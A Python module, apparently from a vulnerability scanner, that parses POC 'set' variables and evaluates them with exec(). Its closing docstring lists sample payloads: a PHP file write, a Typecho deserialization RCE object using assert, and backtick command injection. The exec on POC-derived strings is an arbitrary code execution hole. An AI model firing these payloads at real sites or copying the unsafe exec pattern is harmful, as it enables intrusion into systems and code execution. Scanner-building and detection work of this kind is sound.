# _*_ coding:utf-8 _*_

"""
解析poc中set
"""
import base64
import hashlib
import random
import string
from urllib.parse import quote, unquote
import re

class ParseSet:
    @staticmethod
    def randomInt_(min, max) -> str:
        # 两个范围内的随机数
        return str(random.randint(int(min), int(max)))

    @staticmethod
    def randomLowercase_(length: int) ->str:
        # 指定长度的小写字母组成的随机字符串
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(length))

    @staticmethod
    def base64_(data: [bytes,str]):
        # 将字符串或 bytes 进行 base64 编码
        # print(data)
        if isinstance(data,str):
            data = data.encode('utf-8')
        return base64.b64encode(data).decode('utf-8')  # 进行base64编码后转回字符串

    @staticmethod
    def base64Decode_(data: [bytes,str]) ->str:
        # 将字符串或 bytes 进行 base64 解码
        if isinstance(data, str):
            data = data.encode('utf-8')
        return base64.b64decode(data).decode('utf-8')

    @staticmethod
    def urlencode_(data: [bytes,str]) ->str:
        # 将字符串或 bytes 进行 urlencode 编码
        return quote(data)

    @staticmethod
    def urldecode_(data: [bytes,str]) -> str:
        # 将字符串或 bytes 进行 urldecode 解码
        return unquote(data)

    @staticmethod
    def md5_(s1:str) -> str:
        # 字符串的 md5 (以下都是 0.13.0 版本新增)
        m = hashlib.md5()
        m.update(s1.encode('utf-8'))
        return m.hexdigest()

    @staticmethod
    def exec(parse_str, vuln_set):
        # print(vuln_set)
        # set_context = {
        #     "randomInt":ParseSet.randomInt_,
        #     "randomLowercase":ParseSet.randomLowercase_,
        #     "base64":ParseSet.base64_,
        #     "base64Decode":ParseSet.base64Decode_,
        #     "urlencode":ParseSet.urlencode_,
        #     "urldecode":ParseSet.urldecode_,
        #     "md5": ParseSet.md5_
        #
        # }

        return utils(parse_str=parse_str,vuln_set=vuln_set)


def utils(parse_str:str, vuln_set:dict):

    set_context = {
        "randomInt":ParseSet.randomInt_,
        "randomLowercase":ParseSet.randomLowercase_,
        "base64":ParseSet.base64_,
        "base64Decode":ParseSet.base64Decode_,
        "urlencode":ParseSet.urlencode_,
        "urldecode":ParseSet.urldecode_,
        "md5": ParseSet.md5_
    }

    if str(parse_str).startswith('randomInt') or str(parse_str).startswith('randomLowercase') or str(parse_str).startswith('base64') or str(parse_str).startswith('urlencode'):
        # 如果是以自定义函数开头，那么则开始判断，vuln_set这个字典中的键 是否在 parse_str中
        exists = []
        for _ in list(vuln_set.keys()):  # 遍历传进来的字典的 键
            if f'+{_}+' in parse_str.replace(' ',''):  # 如果 键 在解析字符串中，将 键 添加到 exists 列表中
                exists.append(_)
            elif parse_str.startswith('randomInt'):
                parse_str1 = parse_str.replace('randomInt(','')
                if _ in parse_str1:
                    exists.append(_)
            elif parse_str.startswith('randomLowercase'):
                parse_str2 = parse_str.replace('randomLowercase(','')
                if _ in parse_str2:
                    exists.append(_)
            elif parse_str.startswith('base64'):
                parse_str3 = parse_str.replace('base64(','')
                if _ in parse_str3:
                    exists.append(_)
            elif parse_str.startswith('urlencode'):
                parse_str4 = parse_str.replace('urlencode(','')
                if _ in parse_str4:
                    exists.append(_)
            elif '{{' + _ + '}}' in parse_str:
                exists.append(_)

        # print(parse_str,vuln_set)
        if len(exists) > 0:  # 说明parse_str中还存在其他变量
            for _1 in exists:  # 替换exists 中键对应vuln_set中的值
                if '{{' + _1 + '}}' in parse_str:
                    parse_str = parse_str.replace('{{' + _1 + '}}',vuln_set[_1])
                    # print(parse_str)
                else:
                    parse_str = str(parse_str).replace(_1,'\"'+vuln_set[_1]+'\"')
            # 替换完后，开始执行解析
            # print(parse_str,vuln_set,exists)

            if parse_str.startswith('randomLowercase'):
                parse_str = parse_str.replace('"','')  # 会出现 randomLowercase("10") 这种情况


            # print(parse_str)
            exec('result = ' + parse_str, set_context)

            return set_context['result']
        else:  # 说明parse_str 中不存在其他变量，直接解析执行
            exec('result = ' + parse_str, set_context)
            #  print(parse_str,vuln_set)
            return set_context['result']
    else:
        # 不是以自定义变量开头，但 parse_set 中可能存在其他变量
        exists = []
        for _ in list(vuln_set.keys()):  # 遍历传进来的字典的 键
            if _ in parse_str:  # 如果 键 在解析字符串中，将 键 添加到 exists 列表中
                exists.append(_)
        if len(exists) > 0:
            for _1 in exists:  # 替换exists 中键对应vuln_set中的值
                parse_str = str(parse_str).replace(_1, '"'+vuln_set[_1]+'"')
            return parse_str
        else:
            return parse_str





"""
{'filename': 'randomLowercase(8)', 'r1': 'randomLowercase(8)', 'payload': 'base64("file_put_contents(\'../../"+filename+".php\',\'<?php echo(md5("+r1+"));?>\');")', 'rboundary': 'md5(randomLowercase(8))', 'date': 'TDdate()'}
{'referer': 'request.url', 'random_str': 'randomLowercase(4)', 'payload': 'base64(urldecode("a%3A2%3A%7Bs%3A7%3A%22adapter%22%3BO%3A12%3A%22Typecho_Feed%22%3A2%3A%7Bs%3A19%3A%22%00Typecho_Feed%00_type%22%3Bs%3A8%3A%22ATOM+1.0%22%3Bs%3A20%3A%22%00Typecho_Feed%00_items%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A8%3A%22category%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A18%3A%22print%28md5%28%27" + random_str + "%27%29%29%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7Ds%3A6%3A%22author%22%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A18%3A%22print%28md5%28%27" + random_str + "%27%29%29%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7D%7D%7Ds%3A6%3A%22prefix%22%3Bs%3A8%3A%22typecho_%22%3B%7D"))'}
{'fileName': 'randomLowercase(4) + ".txt"', 'content': 'randomLowercase(8)', 'payload': 'urlencode(base64("`echo " + content + " > " + fileName + "`"))'}
{'var1': '<!DOCTYPE html>', 'var2': 'card_title', 'var3': 'randomInt(800000000, 1000000000)', 'content': 'randomLowercase(8)', 'fileName': 'content + ".csv"', 'payload': 'base64("`echo " + content + " > " + fileName + "`")', 'path': ['swagger-ui.html', 'api/swagger-ui.html', 'service/swagger-ui.html', 'web/swagger-ui.html', 'swagger/swagger-ui.html', 'actuator/swagger-ui.html', 'libs/swagger-ui.html', 'template/swagger-ui.html']}
{'fileName': 'randomLowercase(4) + ".txt"', 'content': 'randomLowercase(8)', 'payload': 'urlencode(base64("`echo " + content + " > " + fileName + "`"))'}
{'r': 'randomLowercase(6)', 'payload': 'base64("printf(md5(\'" + r + "\'));")'}
{'fileName': 'randomLowercase(4) + ".txt"', 'content': 'randomLowercase(8)', 'payload': 'urlencode(base64("`echo " + content + " > " + fileName + "`"))'}
{'r1': 'randomLowercase(4)', 'r2': 'randomLowercase(4)', 'r3': 'randomInt(1,6)', 'phpcode': '"<?php echo \'" + r1 + "\'; unlink(__FILE__); ?>"\n', 'payload': 'base64(phpcode)'}
"""